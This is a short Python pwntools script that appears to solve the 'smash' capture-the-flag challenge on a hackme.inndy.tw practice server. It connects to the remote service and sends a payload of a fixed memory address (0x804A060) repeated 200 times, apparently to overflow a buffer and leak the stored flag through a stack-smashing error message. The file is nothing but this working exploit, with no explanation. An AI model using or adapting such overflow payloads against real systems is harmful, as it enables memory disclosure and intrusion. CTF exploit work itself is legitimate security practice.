#!/usr/bin/env python
# encoding: utf-8

from pwn import *
context.log_level = 'debug'
# io = process('./smash')
io = remote('hackme.inndy.tw', 7717)
elf = ELF('./smash')

loc = 0x804A060
io.recvuntil('flag')

payload = p32(loc) * 200
io.send(payload)

io.interactive()
io.close()
